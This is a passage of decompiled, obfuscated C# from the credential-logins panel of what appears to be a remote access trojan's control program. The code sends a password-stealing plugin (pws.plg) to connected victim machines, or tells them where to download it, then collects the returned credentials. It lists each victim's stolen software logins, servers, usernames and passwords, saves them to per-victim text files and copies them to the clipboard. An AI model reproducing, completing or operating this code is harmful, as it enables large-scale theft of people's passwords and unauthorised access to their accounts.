		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F09 RID: 3849 RVA: 0x00009049 File Offset: 0x00007249
	internal ToolStripSeparator vmethod_98()
	{
		return this.toolStripSeparator_8;
	}

	// Token: 0x06000F0A RID: 3850 RVA: 0x00009051 File Offset: 0x00007251
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_99(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_8 = toolStripSeparator_12;
	}

	// Token: 0x06000F0B RID: 3851 RVA: 0x0000905A File Offset: 0x0000725A
	internal ToolStripStatusLabel vmethod_100()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x06000F0C RID: 3852 RVA: 0x00009062 File Offset: 0x00007262
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_101(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_5;
	}

	// Token: 0x06000F0D RID: 3853 RVA: 0x0000906B File Offset: 0x0000726B
	internal ToolStripStatusLabel vmethod_102()
	{
		return this.toolStripStatusLabel_2;
	}

	// Token: 0x06000F0E RID: 3854 RVA: 0x00009073 File Offset: 0x00007273
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_103(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_2 = toolStripStatusLabel_5;
	}

	// Token: 0x06000F0F RID: 3855 RVA: 0x0000907C File Offset: 0x0000727C
	internal StatusStrip vmethod_104()
	{
		return this.statusStrip_1;
	}

	// Token: 0x06000F10 RID: 3856 RVA: 0x00009084 File Offset: 0x00007284
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_105(StatusStrip statusStrip_2)
	{
		this.statusStrip_1 = statusStrip_2;
	}

	// Token: 0x06000F11 RID: 3857 RVA: 0x0000908D File Offset: 0x0000728D
	internal ToolStripStatusLabel vmethod_106()
	{
		return this.toolStripStatusLabel_3;
	}

	// Token: 0x06000F12 RID: 3858 RVA: 0x00009095 File Offset: 0x00007295
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_107(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_3 = toolStripStatusLabel_5;
	}

	// Token: 0x06000F13 RID: 3859 RVA: 0x0000909E File Offset: 0x0000729E
	internal ToolStripStatusLabel vmethod_108()
	{
		return this.toolStripStatusLabel_4;
	}

	// Token: 0x06000F14 RID: 3860 RVA: 0x000090A6 File Offset: 0x000072A6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_109(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_4 = toolStripStatusLabel_5;
	}

	// Token: 0x06000F15 RID: 3861 RVA: 0x000090AF File Offset: 0x000072AF
	internal ToolStripMenuItem vmethod_110()
	{
		return this.toolStripMenuItem_23;
	}

	// Token: 0x06000F16 RID: 3862 RVA: 0x0006FDB0 File Offset: 0x0006DFB0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_111(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_27);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_23 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F17 RID: 3863 RVA: 0x000090B7 File Offset: 0x000072B7
	internal ToolStripSeparator vmethod_112()
	{
		return this.toolStripSeparator_9;
	}

	// Token: 0x06000F18 RID: 3864 RVA: 0x000090BF File Offset: 0x000072BF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_113(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_9 = toolStripSeparator_12;
	}

	// Token: 0x06000F19 RID: 3865 RVA: 0x000090C8 File Offset: 0x000072C8
	internal ToolStripSeparator vmethod_114()
	{
		return this.toolStripSeparator_10;
	}

	// Token: 0x06000F1A RID: 3866 RVA: 0x000090D0 File Offset: 0x000072D0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_115(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_10 = toolStripSeparator_12;
	}

	// Token: 0x06000F1B RID: 3867 RVA: 0x000090D9 File Offset: 0x000072D9
	internal ToolStripMenuItem vmethod_116()
	{
		return this.toolStripMenuItem_24;
	}

	// Token: 0x06000F1C RID: 3868 RVA: 0x000090E1 File Offset: 0x000072E1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_117(ToolStripMenuItem toolStripMenuItem_27)
	{
		this.toolStripMenuItem_24 = toolStripMenuItem_27;
	}

	// Token: 0x06000F1D RID: 3869 RVA: 0x000090EA File Offset: 0x000072EA
	internal ToolStripMenuItem vmethod_118()
	{
		return this.toolStripMenuItem_25;
	}

	// Token: 0x06000F1E RID: 3870 RVA: 0x0006FDF4 File Offset: 0x0006DFF4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_119(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_30);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_25 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F1F RID: 3871 RVA: 0x000090F2 File Offset: 0x000072F2
	internal ToolStripSeparator vmethod_120()
	{
		return this.toolStripSeparator_11;
	}

	// Token: 0x06000F20 RID: 3872 RVA: 0x000090FA File Offset: 0x000072FA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_121(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_11 = toolStripSeparator_12;
	}

	// Token: 0x06000F21 RID: 3873 RVA: 0x00009103 File Offset: 0x00007303
	internal ToolStripMenuItem vmethod_122()
	{
		return this.toolStripMenuItem_26;
	}

	// Token: 0x06000F22 RID: 3874 RVA: 0x0006FE38 File Offset: 0x0006E038
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_123(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_31);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_26;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_26 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_26;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F23 RID: 3875 RVA: 0x0000910B File Offset: 0x0000730B
	private void fCredentialsLogins_Load(object sender, EventArgs e)
	{
		this.method_0();
	}

	// Token: 0x06000F24 RID: 3876 RVA: 0x0006FE7C File Offset: 0x0006E07C
	public void method_0()
	{
		base.Width = 961;
		base.Height = 623;
		this.vmethod_10().VirtualMode = true;
		this.vmethod_10().View = View.Details;
		this.vmethod_10().FullRowSelect = true;
		this.vmethod_10().OwnerDraw = true;
		this.vmethod_10().UseCellFormatEvents = true;
		this.vmethod_10().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_52().VirtualMode = true;
		this.vmethod_52().View = View.Details;
		this.vmethod_52().FullRowSelect = true;
		this.vmethod_52().OwnerDraw = true;
		this.vmethod_52().UseCellFormatEvents = true;
		this.vmethod_52().Enabled = false;
		this.vmethod_52().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_50().Value = 0;
		checked
		{
			this.vmethod_50().Left = (int)Math.Round(unchecked((double)this.vmethod_52().Left + (double)this.vmethod_52().Width / 2.0 - ((double)this.vmethod_50().Left + (double)this.vmethod_50().Width / 2.0)));
			this.vmethod_50().Top = (int)Math.Round(unchecked((double)this.vmethod_52().Top + (double)this.vmethod_52().Height / 2.0 - ((double)this.vmethod_50().Top + (double)this.vmethod_50().Height / 2.0)));
			this.vmethod_50().ShowText = true;
		}
	}

	// Token: 0x06000F25 RID: 3877 RVA: 0x00070018 File Offset: 0x0006E218
	private void fCredentialsLogins_Resize(object sender, EventArgs e)
	{
		checked
		{
			this.vmethod_10().Columns[0].Width = this.vmethod_10().Width - 180;
			this.vmethod_10().Columns[1].Width = 150;
			int num = (int)Math.Round(Conversion.Val((double)this.vmethod_52().Width / 6.0));
			this.vmethod_52().Columns[0].Width = num - 10;
			this.vmethod_52().Columns[1].Width = num - 10;
			this.vmethod_52().Columns[2].Width = num - 10;
			this.vmethod_52().Columns[3].Width = num - 10;
			this.vmethod_52().Columns[4].Width = num - 10;
			this.vmethod_52().Columns[5].Width = num - 10;
			this.vmethod_50().Left = (int)Math.Round(unchecked((double)this.vmethod_52().Left + (double)this.vmethod_52().Width / 2.0 - ((double)this.vmethod_50().Left + (double)this.vmethod_50().Width / 2.0)));
			this.vmethod_50().Top = (int)Math.Round(unchecked((double)this.vmethod_52().Top + (double)this.vmethod_52().Height / 2.0 - ((double)this.vmethod_50().Top + (double)this.vmethod_50().Height / 2.0)));
			this.vmethod_50().Update();
		}
	}

	// Token: 0x06000F26 RID: 3878 RVA: 0x000701E8 File Offset: 0x0006E3E8
	public void method_1()
	{
		if (this.vmethod_52().InvokeRequired)
		{
			this.vmethod_52().Invoke(new fCredentialsLogins.Delegate77(this.method_2), new object[0]);
			return;
		}
		this.vmethod_52().Enabled = false;
		this.vmethod_52().ClearObjects();
		this.vmethod_52().Update();
		ConcurrentStack<cCredentialsLogin> concurrentStack = new ConcurrentStack<cCredentialsLogin>();
		this.vmethod_70().Value = 0;
		this.vmethod_50().Value = 0;
		FastObjectListView fastObjectListView = Class130.fCredentialsLogins_0.vmethod_10();
		checked
		{
			long num;
			if (fastObjectListView.SelectedObjects != null)
			{
				try
				{
					foreach (object obj in fastObjectListView.SelectedObjects)
					{
						cCredentialsUser cCredentialsUser = (cCredentialsUser)obj;
						num = (long)Math.Round(unchecked((double)num + Conversions.ToDouble(cCredentialsUser.LOGINS)));
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			if (num != 0L)
			{
				this.vmethod_70().Maximum = (int)num;
				this.vmethod_50().MaximumValue = (int)num;
				this.vmethod_50().Visible = true;
				FastObjectListView fastObjectListView2 = Class130.fCredentialsLogins_0.vmethod_10();
				if (fastObjectListView2.SelectedObjects != null)
				{
					try
					{
						foreach (object obj2 in fastObjectListView2.SelectedObjects)
						{
							cCredentialsUser cCredentialsUser2 = (cCredentialsUser)obj2;
							try
							{
								foreach (object obj3 in cCredentialsUser2.xmlList)
								{
									XmlNode xmlNode = (XmlNode)obj3;
									concurrentStack.Push(new cCredentialsLogin
									{
										Key = cCredentialsUser2.Key,
										USER = cCredentialsUser2.USER,
										TYPE = xmlNode.ChildNodes.Item(0).InnerText,
										SOFTWARE = xmlNode.ChildNodes.Item(1).InnerText,
										SERVER = xmlNode.ChildNodes.Item(2).InnerText,
										USERNAME = xmlNode.ChildNodes.Item(3).InnerText,
										PASSWORD = xmlNode.ChildNodes.Item(4).InnerText
									});
									if (this.vmethod_50().Value < this.vmethod_50().MaximumValue)
									{
										ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
										(zeroitAnidasoCircleProgress = this.vmethod_50()).Value = zeroitAnidasoCircleProgress.Value + 1;
										this.vmethod_70().Value = this.vmethod_50().Value;
									}
								}
							}
							finally
							{
								IEnumerator enumerator3;
								if (enumerator3 is IDisposable)
								{
									(enumerator3 as IDisposable).Dispose();
								}
							}
							Application.DoEvents();
						}
					}
					finally
					{
						IEnumerator enumerator2;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
				this.vmethod_70().Value = 0;
				this.vmethod_50().Value = this.vmethod_50().MaximumValue;
				this.vmethod_50().Visible = false;
				this.vmethod_52().SetObjects(concurrentStack.ToList<cCredentialsLogin>());
				this.vmethod_52().Enabled = true;
			}
		}
	}

	// Token: 0x06000F27 RID: 3879 RVA: 0x0007051C File Offset: 0x0006E71C
	public void method_2()
	{
		if (this.vmethod_52().InvokeRequired)
		{
			this.vmethod_52().Invoke(new fCredentialsLogins.Delegate77(this.method_2), new object[0]);
			return;
		}
		this.vmethod_52().Enabled = false;
		this.vmethod_52().ClearObjects();
		this.vmethod_52().Update();
		ConcurrentStack<cCredentialsLogin> concurrentStack = new ConcurrentStack<cCredentialsLogin>();
		this.vmethod_70().Value = 0;
		this.vmethod_50().Value = 0;
		checked
		{
			long num;
			try
			{
				foreach (KeyValuePair<string, cCredentialsUser> keyValuePair in Class130.concurrentDictionary_8)
				{
					num = (long)Math.Round(unchecked((double)num + Conversions.ToDouble(keyValuePair.Value.LOGINS)));
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, cCredentialsUser>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			this.vmethod_70().Maximum = (int)num;
			this.vmethod_50().MaximumValue = (int)num;
			this.vmethod_50().Visible = true;
			try
			{
				foreach (KeyValuePair<string, cCredentialsUser> keyValuePair2 in Class130.concurrentDictionary_8)
				{
					try
					{
						foreach (object obj in keyValuePair2.Value.xmlList)
						{
							XmlNode xmlNode = (XmlNode)obj;
							concurrentStack.Push(new cCredentialsLogin
							{
								Key = keyValuePair2.Value.Key,
								USER = keyValuePair2.Value.USER,
								TYPE = xmlNode.ChildNodes.Item(0).InnerText,
								SOFTWARE = xmlNode.ChildNodes.Item(1).InnerText,
								SERVER = xmlNode.ChildNodes.Item(2).InnerText,
								USERNAME = xmlNode.ChildNodes.Item(3).InnerText,
								PASSWORD = xmlNode.ChildNodes.Item(4).InnerText
							});
							if (this.vmethod_50().Value < this.vmethod_50().MaximumValue)
							{
								ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
								(zeroitAnidasoCircleProgress = this.vmethod_50()).Value = zeroitAnidasoCircleProgress.Value + 1;
								this.vmethod_70().Value = this.vmethod_50().Value;
							}
						}
					}
					finally
					{
						IEnumerator enumerator3;
						if (enumerator3 is IDisposable)
						{
							(enumerator3 as IDisposable).Dispose();
						}
					}
					Application.DoEvents();
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, cCredentialsUser>> enumerator2;
				if (enumerator2 != null)
				{
					enumerator2.Dispose();
				}
			}
			this.vmethod_70().Value = 0;
			this.vmethod_50().Value = this.vmethod_50().MaximumValue;
			this.vmethod_50().Visible = false;
			this.vmethod_52().SetObjects(concurrentStack.ToList<cCredentialsLogin>());
			this.vmethod_52().Enabled = true;
		}
	}

	// Token: 0x06000F28 RID: 3880 RVA: 0x00070804 File Offset: 0x0006EA04
	public void method_3(string string_0, string string_1, string string_2)
	{
		int num;
		int num5;
		object obj2;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (!this.vmethod_10().InvokeRequired)
			{
				goto IL_48;
			}
			IL_17:
			num2 = 3;
			this.vmethod_10().Invoke(new fCredentialsLogins.Delegate75(this.method_3), new object[]
			{
				string_0,
				string_1,
				string_2
			});
			goto IL_3A2;
			IL_48:
			num2 = 5;
			if (!Class130.concurrentDictionary_8.ContainsKey(string_0))
			{
				goto IL_82;
			}
			IL_57:
			num2 = 6;
			this.vmethod_10().RemoveObject(Class130.concurrentDictionary_8[string_0]);
			IL_6F:
			num2 = 7;
			ConcurrentDictionary<string, cCredentialsUser> concurrentDictionary_ = Class130.concurrentDictionary_8;
			cCredentialsUser cCredentialsUser = null;
			concurrentDictionary_.TryRemove(string_0, out cCredentialsUser);
			IL_82:
			num2 = 8;
			cCredentialsUser cCredentialsUser2 = new cCredentialsUser();
			IL_8A:
			num2 = 9;
			cCredentialsUser2.USER = string_1;
			IL_94:
			num2 = 10;
			cCredentialsUser2.LOGINS = "N/A";
			IL_A2:
			num2 = 11;
			cCredentialsUser2.Key = string_0;
			IL_AC:
			num2 = 12;
			checked
			{
				int num3 = cCredentialsUser2.idxValues.Count<string>() - 1;
				for (int i = 1; i <= num3; i++)
				{
					IL_C3:
					num2 = 13;
					cCredentialsUser2.idxValues[i] = "N/A";
					IL_D4:
					num2 = 14;
				}
				IL_E3:
				num2 = 15;
				string_2 = Strings.Replace(string_2, "&", "&amp;", 1, -1, CompareMethod.Text);
				IL_FD:
				num2 = 16;
				if (Operators.CompareString(string_2.Substring(string_2.Length - 46), "</app_password>\r\n</app_password_list>\r\n</root>", true) == 0)
				{
					goto IL_12E;
				}
				IL_11C:
				num2 = 17;
				string_2 += "</app_password>\r\n</app_password_list>\r\n</root>";
				IL_12E:
				num2 = 18;
				XmlDocument xmlDocument = new XmlDocument();
				IL_138:
				num2 = 19;
				xmlDocument.LoadXml(string_2);
				IL_143:
				num2 = 20;
				XmlNodeList xmlNodeList = xmlDocument.SelectNodes("/root/app_password_list/app_password");
				IL_154:
				num2 = 21;
				cCredentialsUser2.LOGINS = Conversions.ToString(xmlNodeList.Count);
				IL_169:
				num2 = 22;
				cCredentialsUser2.xmlList = xmlNodeList;
				IL_174:
				num2 = 23;
				IEnumerator enumerator = xmlNodeList.GetEnumerator();
				while (enumerator.MoveNext())
				{
					object obj = enumerator.Current;
					XmlNode xmlNode = (XmlNode)obj;
					IL_192:
					num2 = 24;
					cCredentialsUser2.sLogins.AppendLine(string.Concat(new string[]
					{
						xmlNode.ChildNodes.Item(0).InnerText,
						"\t",
						xmlNode.ChildNodes.Item(1).InnerText,
						"\t",
						xmlNode.ChildNodes.Item(2).InnerText,
						"\t",
						xmlNode.ChildNodes.Item(3).InnerText,
						"\t",
						xmlNode.ChildNodes.Item(4).InnerText
					}));
					IL_231:
					num2 = 25;
				}
				IL_240:
				num2 = 26;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
				IL_258:
				num2 = 27;
				if (!(Class135.smethod_0().PluginsSavePws & cCredentialsUser2.sLogins.Length > 0))
				{
					goto IL_360;
				}
				IL_279:
				num2 = 28;
				if (File.Exists(Application.StartupPath + "\\Passwords"))
				{
					goto IL_2B2;
				}
				IL_292:
				num2 = 29;
				string directoryName = Path.GetDirectoryName(Application.StartupPath + "\\Passwords");
				Class136.smethod_17(ref directoryName);
				IL_2B2:
				num2 = 30;
				string text = Application.StartupPath + "\\Passwords\\" + Strings.Replace(string_1, "\\", "@", 1, -1, CompareMethod.Text) + ".txt";
				byte[] bytes = Encoding.UTF8.GetBytes(cCredentialsUser2.sLogins.ToString());
				bool flag = true;
				byte[] byte_ = bytes;
				string string_3 = text;
				Class136.Class142 @class = new Class136.Class142();
				@class.string_0 = string_3;
				@class.byte_0 = byte_;
				@class.bool_0 = false;
				try
				{
					if (flag)
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					else
					{
						Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
					}
				}
				catch (Exception ex)
				{
				}
				IL_360:
				num2 = 31;
				Class130.concurrentDictionary_8.TryAdd(string_0, cCredentialsUser2);
				IL_370:
				num2 = 32;
				Class130.concurrentDictionary_8[string_0].Key = string_0;
				IL_384:
				num2 = 33;
				this.vmethod_10().OwnerDraw = true;
				IL_393:
				num2 = 34;
				this.vmethod_10().AddObject(cCredentialsUser2);
				IL_3A2:
				goto IL_482;
				IL_3A7:;
			}
			int num4 = num5 + 1;
			num5 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
			IL_441:
			goto IL_477;
			IL_443:
			num5 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_454:;
		}
		catch when (endfilter(obj2 is Exception & num != 0 & num5 == 0))
		{
			Exception ex2 = (Exception)obj3;
			goto IL_443;
		}
		IL_477:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_482:
		if (num5 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F29 RID: 3881 RVA: 0x00070CD0 File Offset: 0x0006EED0
	private void method_4(object sender, EventArgs e)
	{
		if (!File.Exists(Application.StartupPath + "\\data\\plugins\\pws.plg"))
		{
			Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + "\\data\\plugins\\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
		string str = Class136.smethod_29(ref text);
		if (Class135.smethod_0().PluginsUpload)
		{
			FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
			try
			{
				foreach (object obj in fastObjectListView.Objects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "crd_logins_report_req|" + str;
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return;
		}
		if (Class135.smethod_0().PluginsURLPws.Length < 8 | !Class135.smethod_0().PluginsURLPws.Contains("://") | !Class135.smethod_0().PluginsURLPws.Contains("http") | !Class135.smethod_0().PluginsURLPws.Contains(".") | Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0)
		{
			Interaction.MsgBox("URL to plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			Class130.fSettings_0.Visible = true;
			Class130.fSettings_0.Activate();
			Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
			return;
		}
		FastObjectListView fastObjectListView2 = Class130.fMain_0.vmethod_18();
		try
		{
			foreach (object obj2 in fastObjectListView2.Objects)
			{
				string sKey2 = ((CClient)obj2).sKey;
				string string_ = "crd_logins_report|" + str + "|" + Class135.smethod_0().PluginsURLPws;
				string string_2 = sKey2;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000F2A RID: 3882 RVA: 0x00070FB8 File Offset: 0x0006F1B8
	private void method_5(object sender, EventArgs e)
	{
		if (!File.Exists(Application.StartupPath + "\\data\\plugins\\pws.plg"))
		{
			Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + "\\data\\plugins\\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
		string str = Class136.smethod_29(ref text);
		if (Class135.smethod_0().PluginsUpload)
		{
			FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "crd_logins_report_req|" + str;
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return;
		}
		if (Class135.smethod_0().PluginsURLPws.Length < 8 | !Class135.smethod_0().PluginsURLPws.Contains("://") | !Class135.smethod_0().PluginsURLPws.Contains("http") | !Class135.smethod_0().PluginsURLPws.Contains(".") | Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0)
		{
			Interaction.MsgBox("URL to plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			Class130.fSettings_0.Visible = true;
			Class130.fSettings_0.Activate();
			Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
			return;
		}
		FastObjectListView fastObjectListView2 = Class130.fMain_0.vmethod_18();
		try
		{
			foreach (object obj2 in fastObjectListView2.SelectedObjects)
			{
				string sKey2 = ((CClient)obj2).sKey;
				string string_ = "crd_logins_report|" + str + "|" + Class135.smethod_0().PluginsURLPws;
				string string_2 = sKey2;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000F2B RID: 3883 RVA: 0x000712A0 File Offset: 0x0006F4A0
	private void method_6(object sender, MouseEventArgs e)
	{
		this.vmethod_8().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().Items.Count > 0, true, false));
		this.vmethod_12().Enabled = Conversions.ToBoolean(Interaction.IIf(Class130.fMain_0.vmethod_18().Items.Count > 0, true, false));
		this.vmethod_14().Enabled = Conversions.ToBoolean(Interaction.IIf(Class130.fMain_0.vmethod_18().Items.Count > 0, true, false));
		this.vmethod_16().Enabled = Conversions.ToBoolean(Interaction.IIf(Class130.fMain_0.vmethod_18().SelectedObjects.Count > 0, true, false));
		this.vmethod_34().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().Items.Count > 0, true, false));
		this.vmethod_38().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().SelectedObjects.Count > 0, true, false));
		this.vmethod_24().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().Items.Count > 0, true, false));
		this.vmethod_28().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().SelectedObjects.Count > 0, true, false));
		this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().Items.Count > 0, true, false));
		this.vmethod_46().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().SelectedObjects.Count > 0, true, false));
	}

	// Token: 0x06000F2C RID: 3884 RVA: 0x000714C4 File Offset: 0x0006F6C4
	private void method_7(object sender, EventArgs e)
	{
		try
		{
			this.vmethod_102().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().SelectedObjects.Count);
			this.vmethod_106().Text = "Reports: " + Conversions.ToString(this.vmethod_10().Items.Count);
			FastObjectListView fastObjectListView = this.vmethod_10();
			long num;
			try
			{
				foreach (object obj in fastObjectListView.Objects)
				{
					cCredentialsUser cCredentialsUser = (cCredentialsUser)obj;
					num = checked((long)Math.Round(unchecked((double)num + Conversion.Val(cCredentialsUser.LOGINS))));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.vmethod_108().Text = "Total logins: " + Conversions.ToString(num);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000F2D RID: 3885 RVA: 0x000715C8 File Offset: 0x0006F7C8
	private void method_8(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_10().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06000F2E RID: 3886 RVA: 0x00009113 File Offset: 0x00007313
	private void method_9(object sender, EventArgs e)
	{
		this.method_2();
	}

	// Token: 0x06000F2F RID: 3887 RVA: 0x0000911B File Offset: 0x0000731B
	private void method_10(object sender, EventArgs e)
	{
		this.method_1();
	}

	// Token: 0x06000F30 RID: 3888 RVA: 0x00071634 File Offset: 0x0006F834
	private void method_11(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_10();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsUser cCredentialsUser = (cCredentialsUser)obj;
					stringBuilder.Append(cCredentialsUser.sLogins.ToString());
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F31 RID: 3889 RVA: 0x000716E4 File Offset: 0x0006F8E4
	private void method_12(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_10();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cCredentialsUser cCredentialsUser = (cCredentialsUser)obj;
				stringBuilder.Append(cCredentialsUser.sLogins.ToString());
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
